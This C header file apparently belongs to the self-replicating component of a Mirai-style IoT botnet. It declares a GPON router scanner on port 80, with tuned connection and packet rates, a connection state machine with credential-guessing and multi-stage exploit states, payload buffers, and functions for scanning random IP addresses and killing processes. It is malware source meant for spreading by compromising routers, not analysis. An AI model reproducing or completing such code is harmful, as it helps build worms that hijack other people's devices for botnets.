#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef DEBUG
#define GPON80_SCANNER_MAX_CONNS   3
#define GPON80_SCANNER_RAW_PPS     788
#else
#define GPON80_SCANNER_MAX_CONNS   256
#define GPON80_SCANNER_RAW_PPS     788
#endif

#define GPON80_SCANNER_RDBUF_SIZE  1080
#define GPON80_SCANNER_HACK_DRAIN  64

struct gpon80_scanner_connection
{
    int fd, last_recv;
    enum
    {
        GPON80_SC_CLOSED,
        GPON80_SC_CONNECTING,
        GPON80_SC_GET_CREDENTIALS,
        GPON80_SC_EXPLOIT_STAGE2,
        GPON80_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[GPON80_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void gpon80_scanner();
void gpon80_kill(void);

static void gpon80_setup_connection(struct gpon80_scanner_connection *);
static ipv4_t get_random_gpon80_ip(void);

#endif
